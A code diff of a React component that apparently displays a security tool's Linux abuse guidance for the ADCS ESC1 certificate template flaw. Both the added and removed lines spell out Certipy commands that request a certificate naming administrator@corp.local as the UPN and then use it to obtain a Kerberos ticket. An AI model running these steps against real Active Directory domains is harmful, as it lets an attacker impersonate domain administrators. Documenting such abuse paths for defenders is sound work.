@@ -21,40 +21,25 @@ const LinuxAbuse: FC = () => {
     return (
         <>
             <Typography variant='body2'>
-                ADCS ESC-1 allows the principal to impersonate any other principal in the forest by enrolling in a
+                ADCS ESC1 allows the principal to impersonate any other principal in the forest by enrolling in a
                 template, then using the subsequent certificate to perform NT authentication against a service in the
                 domain. An attacker may perform this attack in the following steps:
             </Typography>
             <Typography variant='body2'>
-                <b>Step 1</b>: Enumerate and save test, JSON, and bloodhound outputs:
+                <b>Step 1</b>:  Use Certipy to request enrollment in the affected template, specifying the target
+                enterprise CA and target principal to impersonate:
             </Typography>
             <Typography component={'pre'}>
                 {
-                    "certipy find -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -bloodhound"
+                    "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local"
                 }
             </Typography>
             <Typography variant='body2'>
-                <b>Step 2</b>: Find vulnerable elements in the output:
+                <b>Step 2</b>: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:
             </Typography>
             <Typography component={'pre'}>
                 {
-                    "certipy find -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -vulnerable -stdout"
-                }
-            </Typography>
-            <Typography variant='body2'>
-                <b>Step 3</b>: Specify a user account in the SAN:
-            </Typography>
-            <Typography component={'pre'}>
-                {
-                    "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -upn 'administrator@corp.local'"
-                }
-            </Typography>
-            <Typography variant='body2'>
-                <b>Step 4</b>: Specify a computer account in the SAN:
-            </Typography>
-            <Typography component={'pre'}>
-                {
-                    "certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.corp.local'"
+                    "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"
                 }
             </Typography>
         </>
